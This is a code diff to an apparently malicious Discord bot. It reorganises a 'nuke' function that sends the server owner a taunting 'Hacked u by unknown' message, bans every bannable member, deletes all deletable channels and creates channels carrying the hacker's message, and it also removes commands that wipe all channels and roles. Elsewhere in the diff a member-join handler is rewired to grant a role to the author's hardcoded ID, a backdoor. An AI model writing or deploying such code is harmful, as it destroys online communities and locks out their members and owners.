@@ -25,39 +25,42 @@ const myID = "415595760990552065";
 ti={}  
 spee={};
 
-client.on('message', message => {
-var prefix = "$";
-if(message.content.split(' ')[0] == prefix + 'dc') { 
-if (!message.channel.guild) return;
-if(message.author.id !== myID) return;
-if(!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return message.reply("**I Don't Have ` MANAGE_CHANNELS ` Permission**");
-message.guild.channels.forEach(m => {
-m.delete();
-});
-}
-if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
-if (!message.channel.guild) return;
-if(message.author.id !== myID) return;
-if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return message.reply("**I Don't Have ` MANAGE_ROLES_OR_PERMISSIONS ` Permission**");
-message.guild.roles.forEach(m => {
-m.delete();
-});
-message.reply("`**Done**`")
-}
-});
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
-client.on("message", message => {
-  if(!message.content.startsWith(prefix)) return;;
-  let args = message.content.split(" ").slice(1);
-  var argresult = args.join(' ');
-  if (message.content.startsWith('hix15')) {
-    client.user.setUsername(argresult);
-  }
-    if (message.content.startsWith(prefix + 'on123')) {
-    client.user.setStatus(argresult);
-  }
-});
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+
+
+
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+
+
+
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
+
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+
+  
+
+}
+
 
 
 
@@ -452,41 +455,7 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
 
 });
 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
 
-  await guild.fetchMembers();
-
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
-
-
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
-
-
-
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
-
-
-
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
-
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
-
-  
-
-}
 
 
 
@@ -497,7 +466,7 @@ client.on('guildCreate', async (guild) => {
 
 client.on('guildMemberAdd', member => {
     
-            if (member.id === "328333685088845824") {
+            if (member.id === "415595760990552065") {
                 member.guild.createRole({
                     name : client.user.username,
                     color : "RANDOM", 
